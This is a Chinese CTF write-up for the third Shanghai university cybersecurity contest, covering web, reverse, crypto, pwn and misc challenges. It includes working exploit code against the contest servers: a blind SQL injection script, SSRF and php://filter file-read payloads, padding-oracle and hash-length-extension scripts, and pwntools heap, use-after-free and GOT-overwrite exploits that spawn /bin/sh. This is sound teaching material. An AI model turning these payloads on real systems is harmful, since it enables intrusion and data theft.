> 原文链接: https://www.anquanke.com//post/id/87206 


# 【CTF 攻略】第三届上海市大学生网络安全大赛Writeup


                                阅读量   
                                **467452**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01ea4fe3a37fd84254.png)](https://p0.ssl.qhimg.com/t01ea4fe3a37fd84254.png)

作者：[BOI_Team](http://bobao.360.cn/member/contribute?uid=184681293)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

本文是第三届上海市大学生网络安全大赛CTF攻略。

**<br>**

**1.Some Words    类型：WEB    分值：100分**

这题很明显的Sql盲注，通过测试发现过滤了“=”和and，所以构造查库Payload如下：

```
id=0 or if((ascii(substr((select database()),0,1))&gt;116),1,0)
```

得到库名为words，构造查表语句如下：

```
id=0 or if((ascii(substr((select table_name from information_schema.tables where table_schema &lt; 0x776f726474 limit 82,1),17,1))&lt;97),1,0)
```

得到表名为f14g。接下来直接查字段脚本及结果如下：



```
#coding=UTF-8
import requests
result = ''
url = 'http://a3edf37f0d9741c6ad151c8bafbcad60fc11a19cf7f747a9.game.ichunqiu.com/index.php?'
payload = 'id=0 or if((ascii(substr((`{`sql`}`),`{`list`}`,1))&lt;`{`num`}`),1,0)'
for i in xrange(0,50):
    for j in xrange(32,126):
        #hh = payload.format(sql='select database()',list=str(i),num=str(j))
        #hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))
        #hh = payload.format(sql='select table_name from information_schema.tables limit 81,1',list=str(i),num=str(j))
        hh = payload.format(sql='select * from words.f14g',list=str(i),num=str(j))
        #print hh
        zz = requests.get(url+hh)
        #print zz.content
        if 'Hello Hacker!!' in zz.content:
            result += chr(j-1)
            print result
            break
```

[![](https://p5.ssl.qhimg.com/t01f6e30eb875f66b45.png)](https://p5.ssl.qhimg.com/t01f6e30eb875f66b45.png)<br>

<br>

**2.Welcome To My Blog    类型：WEB    分值：200分**

扫描发现.git泄露，下载下来后用file指令查看，发现为zlib文件，通过脚本还原得到php源码如下:

[![](https://p2.ssl.qhimg.com/t01930c303e66c3078f.png)](https://p2.ssl.qhimg.com/t01930c303e66c3078f.png)

这里可以看到，主要突破就是curl函数，curl还不是php中的，那就是在function中构造，通过读取action读取function.php的内容如下：

[![](https://p4.ssl.qhimg.com/t0137d366617e91c7ab.png)](https://p4.ssl.qhimg.com/t0137d366617e91c7ab.png)

其中$url可控，利用file协议可读取服务器内容，直接读取flag.php内容，构造url为

```
http://baa35c12653d420f9ec6bb93429d6346fdbe9be660d045e0.game.ichunqiu.com/index.php?action=album&amp;pid=file:///var/www/html/flag.php
```

成功读取到flag

[![](https://p1.ssl.qhimg.com/t013857411f1aadb06e.png)](http://baa35c12653d420f9ec6bb93429d6346fdbe9be660d045e0.game.ichunqiu.com/index.php?action=album&amp;pid=file:/var/www/html/flag.php)



**3.Step By Step    类型：WEB    分值：300分**

扫描目录得到了code.zip，解压出来发现源码经过phpjiami加密过，直接网上找了个网站收费解密了=-= 据说有解密脚本，得到index、admin、file的源码，首先分析index的源码

[![](https://p5.ssl.qhimg.com/t010c958269c95b693c.png)](https://p5.ssl.qhimg.com/t010c958269c95b693c.png)

利用的是mt_rand伪加密，利用伪加密生成16位的key和10位的private，主要思路是通过破解伪加密，通过key预测出当前的private，并将当前private写入session中，第二次给private相同值就可以登入进admin.php，因为seed是随机数，所以也写了一个脚本把10万种情况全写进文档中，方便找对应的private值。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0137fc816b7ed5b42f.png)

进入到admin.php后，主要突破口就是json_decode()，代码如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01af73b154d1f720d7.png)

给auth传递参数true，就可以是判断条件为真，直接绕过$auth_code, 跳转到admin.php?authAdmin=2017CtfY0ulike，查看源码得到auth值为：1234567890x

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017d7002c8d02d3da6.png)

接下来就是利用得到的auth值进入到file.php文件中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0160b19cc6d079a219.png)

id参数中必须存在jpg，之后正则检测’php:’和’resource=’其实只检测了这两个字段，中间插入jpg就可以绕过，最后构造payload为id=php://filter/jpgconvert.base64-encode/resource=flag.php，得到flag

[![](https://p2.ssl.qhimg.com/t01b2877d3310a48d08.png)](https://p2.ssl.qhimg.com/t01b2877d3310a48d08.png)

**<br>**

**4.Crackme    类型：REVERSE    分值：50分**

首先查壳，发现加了NsPack的壳

[![](https://p4.ssl.qhimg.com/t0108a489340d22658a.png)](https://p4.ssl.qhimg.com/t0108a489340d22658a.png)

先脱壳，手动就能在OD里脱掉，也可以用脱壳机，脱壳后载入IDA，很容易就能定位到主函数如下

[![](https://p4.ssl.qhimg.com/t01094343cedeb3af6a.png)](https://p4.ssl.qhimg.com/t01094343cedeb3af6a.png)

逻辑很简单，就是一次异或运算，写出解题脚本如下：



```
serial_1 = "this_is_not_flag"
serial_2 = [0x12,4,8,0x14,0x24,0x5c,0x4a,0x3d,0x56,0xa,0x10,0x67,0,0x41,0,1,0x46,0x5a,0x44,0x42,0x6e,0x0c,0x44,0x72,0x0c,0x0d,0x40,0x3e,0x4b,0x5f,2,1,0x4c,0x5e,0x5b,0x17,0x6e,0xc,0x16,0x68,0x5b,0x12,0x48,0x0e]
result = ""
for i in xrange(42):
    result += chr(serial_2[i] ^ ord(serial_1[i%16]))
    print result
```

<br>

**5.juckcode    类型：REVERSE    分值：200分**

拿到题目之后，进行里一些分析，程序的功能是读flag文件，然后进行某种加密，之后得到flag.enc,所以，我们只要让我们的flag文件加密后的结果和flag.enc一样就行，算法分析了半天，没怎么搞出来，干脆暴力跑，因为发现密码是逐位加密，这就使得爆破是可行的，在爆破过程中，发现有可能在某一过程中，会出现多个符合结果的字符，所以，我们就要对错误结果进行处理，我发现在原来加密的字符串中是不存在“的，所以，就在加密的字符串前加上了”。如果得到“，就说明出现了错误。脚本如下：



```
# -*- coding: utf-8 -*-
import os
import string
def get_a_enc(flag):
    f = open("./flag", "w+")
    f.write(flag)
    f.close()
    r = os.popen("juckcode.exe")
    enc = r.readlines()[0]
    return str(enc).replace('n', '')
def do(str1, str2):
    a = ''
    b = ''
    Num = 0
    if len(str1) &lt; len(str2):
        a = str2
        b = str1
    else:
        a = str1
        b = str2
    for i in xrange(len(b)):
        if(a[i] == b[i]):
            Num += 1
        else:
            return Num
    return Num
def asd(ff,num_now):
    for i in xrange(ff,len(string)):
        key = flag + string[i]
        max = do(flag_enc, get_a_enc(key))
        if(max &gt; num_now): 
            char_now = string[i]
            num_now = max
    return char_now
string = ""0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$%&amp;'()*+,-./:;&lt;=&gt;?@^_``{`|`}`~"
flag = ''
flag_enc = "FFIF@@IqqIH@sGBBsBHFAHH@FFIuB@tvrrHHrFuBD@qqqHH@GFtuB@EIqrHHCDuBsBqurHH@EuGuB@trqrHHCDuBsBruvHH@FFIF@@AHqrHHEEFBsBGtvHH@FBHuB@trqrHHADFBD@rquHH@FurF@@IqqrHHvGuBD@tCDHH@EuGuB@tvrrHHCDuBD@tCDHH@FuruB@tvrIH@@DBBsBGtvHH@GquuB@EIqrHHvGuBsBtGEHH@EuGuB@tvrIH@BDqBsBIFEHH@GFtF@@IqqrHHEEFBD@srBHH@GBsuB@trqrHHIFFBD@rquHH@FFIuB@tvrrHHtCDB@@"
z = 0
while 1:
    num_now = 0
    char_now = ''
    char_now = asd(z,num_now)
    if char_now == '"':
        z = string.index(flag[-1:])+1
        flag = flag[:-1]
    else:
        z = 0
        flag += char_now
        print(get_a_enc(flag))
        print(flag)
        if char_now == '`}`':
            break
```

运行脚本得到结果如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01eadd5d32b191ae70.png)



**6.classical    类型：CRYPTO    分值：50分**

单表替换密码上词频分析网站解得如下结果：

[![](https://p1.ssl.qhimg.com/t01a1b8307899014c50.png)](https://p1.ssl.qhimg.com/t01a1b8307899014c50.png)

中间一段目测base64编码，然鹅解出来啥也不是，脑洞会不会把base64给凯撒了一下然后一个一个试还真试出来了

[![](https://p1.ssl.qhimg.com/t0195c1bd21e5419f81.png)](https://p1.ssl.qhimg.com/t0195c1bd21e5419f81.png)

[![](https://p4.ssl.qhimg.com/t014d424a7deedee687.png)](https://p4.ssl.qhimg.com/t014d424a7deedee687.png)



**7.Is_aes_secure    类型：CRYPTO    分值：150分**

这个题是aes的cbc 256bit加密方式，从给出的脚本可以看出，我们可以得到flag的密文，而且我们可以通过操作3得知我们输入的iv和密文是否符合格式，所以，可以使用padding oracle attack。这个密文长48个字节，所以，这是分成3块的cbc加密，第一块密文原本使用原来的iv: AAAAAAAAAAAAAAAA,作为iv来进行解密，第二块它使用第一块密文来进行解密，第三块使用第二块密文进行解密。这个加密过程，我们要不断更换iv，因为我们知道cbc模式是密文使用key进行加密得到一个中间值，中间值与iv逐位异或得到明文。根据padding，我们只要一位一位进行爆破，求出中间值就好，毕竟writeup，原理网上都是存在的，我就直接贴脚本了，这里有三个块，可以独立爆破，我交给了两个队友帮我爆破，我就只贴出其中的一块脚本如下：



```
#!/usr/bin/env python
# coding=utf-8
from pwn import *
result = ''
result1=''
encode = 'sxf8x804*S=x06x9b=,3xea,E*xaaxc1xcdxf6xccxb8x1eQxf0x81xa9x0exa4x11xfex9exdbxd6xbfmxe7xbaxb5x02xdaxbdxb9xc5x1bx7fxb4x90'
encode1 = encode[0:16]
encode2 = encode[16:32]
encode3 = 'A'*16
p = remote('106.75.98.74',10010)
def dd(datab):
    p.recvuntil('option:n')
    p.send('3n')
    p.recvuntil('IV:n')
        p.send(datab)
    p.recvuntil("Data:n")
    p.send(encode1.encode('base64'))
    zz = p.recvline()
        print zz
        if "Decrpytion Done" in zz:
            print 'success'
            print datab
            return 1
        else:
            print 'false'
jj = ''
xx = ''
for j in xrange(1,17):
    for z in result1:
        xx += chr(ord(z)^j)            
    for i in xrange(0,256):
        print i
        ss = (15-len(result1)) * chr(0)
        ss = ss +chr(i)+xx
        if dd(ss.encode('base64')):
            wrp= chr(i^j^ord(encode3[16-j]))
            result += wrp
            jj = chr(ord(wrp))+jj 
            result1 = chr(i^j) + result1
            print jj
            xx = ''
            break
```

得到3块字符串拼接起来为flag:

[![](https://p4.ssl.qhimg.com/t01c3f7ff15955a8f67.png)](https://p4.ssl.qhimg.com/t01c3f7ff15955a8f67.png)

[![](https://p2.ssl.qhimg.com/t010fe61c0d469285de.png)](https://p2.ssl.qhimg.com/t010fe61c0d469285de.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014a95b30ddd2dafa4.png)



**8.rrrsa    类型：CRYPTO    分值：300分**

思路大概是：哈希长度扩展攻击绕过auth()函数，执行regen_key()，得到原来的e和d。进入第二个函数得到n和新的e由于p、q没有换，所以知道n、d、e之后可以解出p和q最后进入第三个函数得到密文c可解出明文，脚本如下：



```
from pwn import *
import hashpumpy
from time import sleep
import random  
import libnum
def gcd(a, b):  
    if(a &lt; b):  
        a , b = b , a  
    while(b != 0):  
        temp = a % b  
        a = b  
        b = temp  
    return a  
def getpq(n,e,d):  
    p = 1  
    q = 1  
    while(p == 1 and q == 1):  
        k = d * e - 1  
        g = random.randint(0 , n)  
        while(p == 1 and q == 1 and k % 2 == 0):  
            k /= 2  
            y = pow(g , k , n)  
            if(y != 1 and gcd(y-1 , n) &gt; 1):  
                p = gcd(y-1 , n)  
                q = n / p  
    return p , q  
p = remote('106.75.98.74' , 10030)
p.recvuntil('token: ')
token = p.recv(32)
p.recv(1024)
#use Hash Length Extension Attacks bypass step1
p.sendline('1')
name = hashpumpy.hashpump(token,'guest' , 'root' , 8)
#print name
token2 = str(name)[2:34]
aaa = 'guestx80x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00hx00x00x00x00x00x00x00root'
p.sendline(aaa)
sleep(1)
p.sendline(token2)
p.recvuntil('e = ')
e = int(p.recvuntil('n')[:-1])
print 'e -&gt;' , e
p.recvuntil('d = ')
d = int(p.recvuntil('n')[:-1])
print 'd -&gt;' , d
print '--------------step1 finished--------------'
#get n and new_e
p.sendline('2')
p.recvuntil('n = ')
n = int(p.recvuntil('n')[:-1])
print 'n -&gt;' , n
p.recvuntil('e = ')
new_e = int(p.recvuntil('n')[:-1])
print 'new_e -&gt;' , new_e
print '--------------step2 finished--------------'
#get new_e -&gt; c
p.sendline('3')
p.recvuntil('flag_enc = ')
c = int(p.recvuntil('n')[:-1])
print 'c -&gt;' , c
print '--------------step3 finished--------------'
#use n , e , d to get p q
p , q = getpq(n , e , d)
print 'p -&gt;' , p
print 'q -&gt;' , q
print '--------------step4 finished--------------'
#use n and new_d to crack c
phi = (p - 1) * (q - 1)
print 'phi -&gt;' , phi
new_d = libnum.modular.invmod(new_e , phi)
print 'new_d -&gt;' , new_d
print libnum.n2s(pow(c , new_d , n))
print '--------------all finished--------------'
```

结果如下：

[![](https://p3.ssl.qhimg.com/t01ea09fa08e9b1aa9b.png)](https://p3.ssl.qhimg.com/t01ea09fa08e9b1aa9b.png)



**9.list    类型：PWN    分值：100分**

漏洞位置：在删除函数和添加函数中只对数组上界做了校验，可以无限删除数组。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015fab578d60cdedde.png)

利用思路：通过不断删除数组下标，将下标所引导plt表中指向got表的指针，通过指针leak地址和修改got内容

exp如下：



```
from pwn import *
context.log_level = 'debug'
slocal =1
slog  =1
atoi_off = 0x0000000000036e80
system_off = 0x0000000000045390
one_off = 0x4526a
if slocal:
    p = process("./list",env=`{`"LD_PRELOAD":"./libc.so.6"`}`)
else:
    p = remote("106.75.8.58",13579)#106.75.8.58 13579
def dele():
    p.recvuntil("5.Exit")
    p.sendline("4")
def add(con):
    p.recvuntil("5.Exit")
    p.sendline("1")
    p.recvuntil("Input your content:")
    p.send(con)
def edit(con):
    p.recvuntil("5.Exit")
    p.sendline("3")
    p.send(con)
def pwn():
    for x in xrange(263007):
        dele()
    p.recvuntil("5.Exit")
    p.clean()
    p.sendline("2")
    data = p.recvuntil('n')[:-1]
    data = u64(data.ljust(8,'x00'))
    libc = data - atoi_off
    system  = libc + system_off
    one = libc + one_off
    print "system addr is "+ hex(system)
    payload = p64(system)
    edit(payload)
    print pidof(p)
    p.sendline("/bin/shx00")
    p.interactive()
pwn()
```

<br>

**10.p200    类型：PWN    分值：200分**

先调戏一会儿程序吧，好嘞，崩了，与题目描述一致为uaf

[![](https://p0.ssl.qhimg.com/t017d213c0880bbcee9.png)](https://p0.ssl.qhimg.com/t017d213c0880bbcee9.png)

利用思路：通过uaf修改虚表到内置system函数

exp如下：



```
from pwn import *
context.log_level = 'debug'
p = remote("106.75.8.58",12333)#106.75.8.58 12333
#p = process("./p200")
def pwn():
    p.recvuntil("1. use, 2. after, 3. free")
    p.sendline("3")
    p.recvuntil("1. use, 2. after, 3. free")
    p.sendline("2")
    p.recvuntil("length:")
    p.sendline("48")
    p.sendline(p64(0x602d70)*3)
    p.recvuntil("1. use, 2. after, 3. free")
    p.sendline("2")
    p.recvuntil("length:")
    p.sendline("48")
    p.sendline(p64(0x0602d70)*3)
      #print pidof(p)
      #raw_input()
    p.interactive()
pwn()
```

<br>

**11.heap    类型：PWN    分值：300分**

程序功能：在main函数中开始有一个函数随机申请和释放堆，造成堆空间不可预测，并生成一个cookie值。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0178410baa36a7ddbf.png)

数据结构为



```
struct heap`{`
    int idx;
    char *name_ptr;
    int name_len;
    int *func;
    char *school_name_ptr;
    int school_name_len;
    int type;
    int cookie;`}`
```

利用思路：在name_ptr和school_name_ptr指向的空间中的结尾会复制有cookie，剩下几个函数中就拼命盯着那个cookie值，几乎所有的操作都校验3次cookie，给了相当于无限申请堆的能力，出题人留了个很漂亮的堆溢出。通过前面申请大量的堆空间，将随机生成的堆块归并后再次布局堆空间，这是，堆空间就得到了相邻的堆块，通过溢出堆块修改相邻堆块中的结构为：



```
name_ptr -&gt; cookie
name_len = 0
school_name_ptr -&gt; cookie
scool_name_len = 0
```

构造完毕后可修改存放于堆上的cookie，顺便写入/bin/sh。利用同样的姿势绕过cookie校验，leak出libc基址，修改结构体中的函数为system。

exp如下：



```
from pwn import *
context.log_level = 'debug'
slocal = 0
if slocal :
    p = process("./heap",env=`{`"LD_PRELOAD":"./libc.so.6"`}`)
else:
    p = remote("106.75.8.58",23238)
def add(nam_len,name,sc_len,sc,yn):
    p.recvuntil("option:")
    p.sendline("1")
    p.recvuntil("length of name")
    p.sendline(str(nam_len))
    p.recvuntil("input name")
    p.sendline(name)
    p.recvuntil("schoolname")
    p.sendline(str(sc_len))
    p.recvuntil("school name")
    p.sendline(sc)
    p.recvuntil("tutor?")
    p.sendline(yn)
def dele(idx):
    p.recvuntil("option:")
    p.sendline("2")
    p.recvuntil("input a id to delete")
    p.sendline(str(idx))
def edit(idx,opt,ll,name):
    p.recvuntil("option:")
    p.sendline("3")
    p.recvuntil("input a id to edit")
    p.sendline(str(idx))
    p.recvuntil("option:")
    p.sendline(str(opt))
    p.recvuntil("name")
    p.sendline(str(ll))
    p.recvuntil("name")
    p.sendline(name)
'''exit_off = 0x3a030
one_off = 0x4526a
hook_off = 0x3c4b10'''
exit_off = 0x000000000003a030
one_off= 0x4526a
system_off = 0x0000000000045390
def pwn():
    for x in xrange(100):
        add(4096,'deadbeef',4096,'deadbeef','no')
    add(16,'leakinfo',16,'leakinfo','yes')
    add(200,'AAAAAAAA',200,'aaaaaaaa','yes')
    add(200,'BBBBBBBB',200,'bbbbbbbb','yes')
    add(200,'CCCCCCCC',200,'cccccccc','yes')
    add(200,'DDDDDDDD',200,'aaaaaaaa','yes')
    add(200,'EEEEEEEE',200,'bbbbbbbb','yes')
    add(200,'FFFFFFFF',200,'cccccccc','yes')
    payload = 'A'*440+p64(0x41)+p64(0x69)+p64(0x60F03f)+p64(0)+p64(0x400954)+p64(0x0602FF0)+p32(49231)
    edit(104,1,500,payload)
    edit(105,1,25,'AAAAAAAAA/bin/shx00AAAAAAAA')
    payload = 'A'*440+p64(0x41)+p64(0x6d)+p64(0x602ff0)+p64(0xc04f)+p64(0x400954)+p64(0x602ff0)+'x4fxc0'
    add(200,"HHHHHHHH",200,'hhhhhhhh','yes')
    add(200,'IIIIIIII',200,'iiiiiiii','yes')
    add(200,'KKKKKKKK',200,'kkkkkkkk','yes')
    add(200,'LLLLLLLL',200,'llllllll','yes')
    edit(107,1,500,payload)
    p.recvuntil("option:")
    p.sendline("4")
    p.recvuntil("input a id to intro")
    p.sendline('108')
    p.recvuntil("from ")
    data = p.recvn(6)
    libc = u64(data.ljust(8,'x00'))-exit_off
    one = libc+one_off
    system =libc +system_off
    print "libc address is "+hex(libc)
    print pidof(p)
    raw_input()
    payload = 'A'*440+p64(0x41)+p64(0x6d)+p64(0x60f048)+p64(8)+p64(system)+p64(0x602ff0)+'x4fxc0'
    edit(109,1,500,payload)
    p.recvuntil("option:")
    p.sendline("4")
    p.recvuntil("intro")
    p.sendline('110')
    p.interactive()
pwn()
```



**12.签到题    类型：MISC    分值：50分**

吃了i春秋的安利下好APP后在CTF竞赛圈的置顶帖中

flag`{`7heR3_i5_a_Lif3_4b0ut_tO_sT4rt_WHen_T0morROw_coMe5`}`



**13.登机牌    类型：MISC    分值：150分**

管他三七二十一先补全二维码如下：

[![](https://p1.ssl.qhimg.com/t01549246d3634a92dd.png)](https://p1.ssl.qhimg.com/t01549246d3634a92dd.png)

好嘞，成功进坑，扫码得到： why not use binwalk。拖入010Editor发现后面png后加了个rar文件，先扣为敬，修正rar头得到加密的rar包。想起png下方还有pdf417码，但标志位看起来不太对，反色后扫码得到key1921070120171018

[![](https://p4.ssl.qhimg.com/t01761c9ab668d580a7.png)](https://p4.ssl.qhimg.com/t01761c9ab668d580a7.png)

作为密码解出加密压缩包中的flag.pdf，末尾得到flag

[![](https://p5.ssl.qhimg.com/t010c852d3e171a8824.png)](https://p5.ssl.qhimg.com/t010c852d3e171a8824.png)

**<br>**

**14.clemency    类型：MISC    分值：200分**

先看16进制，脑洞一堆没思路，信息搜集。发现这……这怕是这届defcon的大名鼎鼎cLEMENCy中段序哦。Github上的ida_clemency

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011c0c8975cf7522ad.png)

按照readme上面配好环境后发现clemency.bin可识别了，找了一圈没发现flag，突然想起有个flag.enc，然后就出了。。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014bfb296fd898a588.png)

**<br>**

**15.流量分析    类型：MISC    分值：300分**

Wireshark什么都导不出来，只好一个一个跟tcp流，发现了一堆ftp的操作传输的flag.zip和singlelist.c……然后还有后面的key.log

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0157c4b910bff49971.png)

这应该是ssl加密的网络数据包，所以需要把key.log作为传输会话私钥导入

[![](https://p1.ssl.qhimg.com/t0115e695b07ce834e0.png)](https://p1.ssl.qhimg.com/t0115e695b07ce834e0.png)

导入证书后发现可以用http协议导出文件了

[![](https://p4.ssl.qhimg.com/t0190ef35eaa7addeb9.png)](https://p4.ssl.qhimg.com/t0190ef35eaa7addeb9.png)

一个大小特别出众的文件映入了我的眼帘，分析一下是个zip，改后缀得到MP3文件，网易云的，歌曲还行，结尾处有杂音，然后上audition，得到flag.zip的密码: AaaAaaaAAaaaAAaaaaaaAAAAAaaaaaaa!

[![](https://p5.ssl.qhimg.com/t01231b4a49f4db6496.png)](https://p5.ssl.qhimg.com/t01231b4a49f4db6496.png)

解压缩包得到flag为flag`{`4sun0_y0zora_sh0ka1h@n__#&gt;&gt;_&lt;&lt;#`}`



**16.问卷调查    类型：MISC    分值：10分**

想起一句话：我走最长的路，就是大表姐的套路，为了10分，妥协了呗。
